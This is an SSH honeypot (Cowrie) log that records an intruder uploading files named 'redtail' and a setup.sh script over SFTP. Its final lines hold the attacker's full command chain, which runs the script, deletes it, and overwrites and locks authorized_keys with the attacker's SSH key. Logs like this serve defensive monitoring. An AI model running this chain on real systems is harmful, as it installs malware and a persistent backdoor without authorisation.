+2024-06-07T07:53:18.734789Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:18.735023Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=51
+2024-06-07T07:53:19.041504Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=52
+2024-06-07T07:53:19.348934Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:19.349172Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=53
+2024-06-07T07:53:19.655794Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=54
+2024-06-07T07:53:19.962531Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:19.962772Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=55
+2024-06-07T07:53:20.269167Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=56
+2024-06-07T07:53:20.576501Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:20.576773Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=57
+2024-06-07T07:53:20.882967Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=58
+2024-06-07T07:53:21.189541Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:21.189781Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=59
+2024-06-07T07:53:21.496403Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=60
+2024-06-07T07:53:21.803822Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:21.804054Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=61
+2024-06-07T07:53:22.110371Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=62
+2024-06-07T07:53:22.417038Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:22.417272Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=63
+2024-06-07T07:53:22.723839Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=64
+2024-06-07T07:53:23.030547Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:23.030782Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=65
+2024-06-07T07:53:23.337664Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=66
+2024-06-07T07:53:23.644427Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:23.644662Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=67
+2024-06-07T07:53:23.950964Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=68
+2024-06-07T07:53:24.257838Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:24.258075Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=69
+2024-06-07T07:53:24.564916Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=70
+2024-06-07T07:53:24.871606Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:24.871830Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=71
+2024-06-07T07:53:25.178989Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=72
+2024-06-07T07:53:25.485476Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:25.485710Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=73
+2024-06-07T07:53:25.792437Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=74
+2024-06-07T07:53:26.105558Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:26.105799Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=75
+2024-06-07T07:53:26.412057Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=76
+2024-06-07T07:53:26.720482Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:26.721850Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=77
+2024-06-07T07:53:27.028070Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=78
+2024-06-07T07:53:27.334647Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:27.334888Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=79
+2024-06-07T07:53:27.641027Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=80
+2024-06-07T07:53:27.946802Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=81
+2024-06-07T07:53:27.947036Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP openFile: b'redtail.i686'
+2024-06-07T07:53:28.253747Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=82
+2024-06-07T07:53:28.560221Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 74455 to 56617 in channel 0
+2024-06-07T07:53:28.560450Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=83
+2024-06-07T07:53:28.866849Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=84
+2024-06-07T07:53:29.173466Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:29.173694Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=85
+2024-06-07T07:53:29.480240Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=86
+2024-06-07T07:53:29.787072Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:29.787299Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=87
+2024-06-07T07:53:30.093803Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=88
+2024-06-07T07:53:30.400626Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:30.400901Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=89
+2024-06-07T07:53:30.707295Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=90
+2024-06-07T07:53:31.013963Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:31.014192Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=91
+2024-06-07T07:53:31.321749Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=92
+2024-06-07T07:53:31.628640Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:31.628904Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=93
+2024-06-07T07:53:31.935357Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=94
+2024-06-07T07:53:32.242886Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:32.243142Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=95
+2024-06-07T07:53:32.549733Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=96
+2024-06-07T07:53:32.856744Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:32.856985Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=97
+2024-06-07T07:53:33.163399Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=98
+2024-06-07T07:53:33.469883Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:33.470121Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=99
+2024-06-07T07:53:33.776482Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=100
+2024-06-07T07:53:34.083679Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:34.083920Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=101
+2024-06-07T07:53:34.390288Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=102
+2024-06-07T07:53:34.696926Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:34.697162Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=103
+2024-06-07T07:53:35.003900Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=104
+2024-06-07T07:53:35.310795Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:35.311023Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=105
+2024-06-07T07:53:35.617580Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=106
+2024-06-07T07:53:35.923969Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:35.924211Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=107
+2024-06-07T07:53:36.230551Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=108
+2024-06-07T07:53:36.537336Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:36.537572Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=109
+2024-06-07T07:53:36.844203Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=110
+2024-06-07T07:53:37.151050Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:37.152267Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=111
+2024-06-07T07:53:37.459014Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=112
+2024-06-07T07:53:37.765582Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:37.765821Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=113
+2024-06-07T07:53:38.072274Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=114
+2024-06-07T07:53:38.380488Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:38.380749Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=115
+2024-06-07T07:53:38.687980Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=116
+2024-06-07T07:53:38.994475Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:38.994726Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=117
+2024-06-07T07:53:39.301359Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=118
+2024-06-07T07:53:39.608159Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:39.608391Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=119
+2024-06-07T07:53:39.914880Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=120
+2024-06-07T07:53:40.221635Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:40.221868Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=121
+2024-06-07T07:53:40.528386Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=122
+2024-06-07T07:53:40.835662Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:40.835893Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=123
+2024-06-07T07:53:41.142339Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=124
+2024-06-07T07:53:41.449138Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:41.449376Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=125
+2024-06-07T07:53:41.755894Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=126
+2024-06-07T07:53:42.063032Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:42.063266Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=127
+2024-06-07T07:53:42.369947Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=128
+2024-06-07T07:53:42.678171Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:42.678398Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=129
+2024-06-07T07:53:42.986292Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=130
+2024-06-07T07:53:43.292881Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=131
+2024-06-07T07:53:43.598840Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=132
+2024-06-07T07:53:43.599065Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP openFile: b'redtail.x86_64'
+2024-06-07T07:53:43.905605Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 97897 to 33175 in channel 0
+2024-06-07T07:53:43.905848Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=133
+2024-06-07T07:53:44.212196Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=134
+2024-06-07T07:53:44.518935Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:44.519173Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=135
+2024-06-07T07:53:44.825586Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=136
+2024-06-07T07:53:45.132247Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:45.132474Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=137
+2024-06-07T07:53:45.440192Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=138
+2024-06-07T07:53:45.746711Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:45.746940Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=139
+2024-06-07T07:53:46.053213Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=140
+2024-06-07T07:53:46.361518Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:46.361748Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=141
+2024-06-07T07:53:46.668164Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=142
+2024-06-07T07:53:46.974658Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:46.974886Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=143
+2024-06-07T07:53:47.281292Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=144
+2024-06-07T07:53:47.587890Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:47.589117Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=145
+2024-06-07T07:53:47.895617Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=146
+2024-06-07T07:53:48.202418Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:48.202651Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=147
+2024-06-07T07:53:48.509089Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=148
+2024-06-07T07:53:48.815681Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:48.815914Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=149
+2024-06-07T07:53:49.122405Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=150
+2024-06-07T07:53:49.429106Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:49.429343Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=151
+2024-06-07T07:53:49.735527Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=152
+2024-06-07T07:53:50.041995Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:50.042226Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=153
+2024-06-07T07:53:50.348518Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=154
+2024-06-07T07:53:50.656732Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:50.656975Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=155
+2024-06-07T07:53:50.963271Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=156
+2024-06-07T07:53:51.269707Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:51.269950Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=157
+2024-06-07T07:53:51.576642Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=158
+2024-06-07T07:53:51.883360Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:51.883588Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=159
+2024-06-07T07:53:52.190485Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=160
+2024-06-07T07:53:52.497401Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:52.497637Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=161
+2024-06-07T07:53:52.803877Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=162
+2024-06-07T07:53:53.111477Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:53.111709Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=163
+2024-06-07T07:53:53.419324Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=164
+2024-06-07T07:53:53.727187Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:53.727427Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=165
+2024-06-07T07:53:54.033643Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=166
+2024-06-07T07:53:54.340083Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:54.340323Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=167
+2024-06-07T07:53:54.646670Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=168
+2024-06-07T07:53:54.953358Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:54.953598Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=169
+2024-06-07T07:53:55.260016Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=170
+2024-06-07T07:53:55.566731Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:55.566968Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=171
+2024-06-07T07:53:55.873257Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=172
+2024-06-07T07:53:56.179885Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:56.180119Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=173
+2024-06-07T07:53:56.486565Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=174
+2024-06-07T07:53:56.793174Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:56.793406Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=175
+2024-06-07T07:53:57.099765Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=176
+2024-06-07T07:53:57.406626Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:57.406856Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=177
+2024-06-07T07:53:57.713117Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=178
+2024-06-07T07:53:58.020972Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:58.022312Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=179
+2024-06-07T07:53:58.329307Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=180
+2024-06-07T07:53:58.635857Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:58.636088Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=181
+2024-06-07T07:53:58.943560Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=182
+2024-06-07T07:53:59.250028Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T07:53:59.250254Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=183
+2024-06-07T07:53:59.556364Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=184
+2024-06-07T07:53:59.862248Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=185
+2024-06-07T07:53:59.862493Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP openFile: b'setup.sh'
+2024-06-07T07:54:00.168707Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=186
+2024-06-07T07:54:00.474591Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2024-06-07T07:54:00.474885Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2024-06-07T07:54:00.846067Z [twisted.conch.ssh.session#info] Executing command "b'chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"\n'"
+2024-06-07T07:54:00.847011Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] CMD: chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; 
+2024-06-07T07:54:00.848073Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: chmod +x setup.sh
+2024-06-07T07:54:00.848778Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: sh setup.sh
+2024-06-07T07:54:00.848919Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: rm -rf setup.sh
+2024-06-07T07:54:00.849081Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: mkdir -p ~/.ssh
+2024-06-07T07:54:00.849240Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: chattr -ia ~/.ssh/authorized_keys
+2024-06-07T07:54:00.849359Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629 > ~/.ssh/authorized_keys
+2024-06-07T07:54:00.849755Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: chattr +ai ~/.ssh/authorized_keys
+2024-06-07T07:54:00.849895Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: uname -a
+2024-06-07T07:54:00.850199Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,79,164.215.103.47] Command found: echo -e \x61\x75\x74\x68\x5F\x6F\x6B\x0A
+2024-06-07T07:54:00.850486Z [twisted.conch.ssh.session#info] exitCode: 0
+2024-06-07T07:54:00.850606Z [cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'
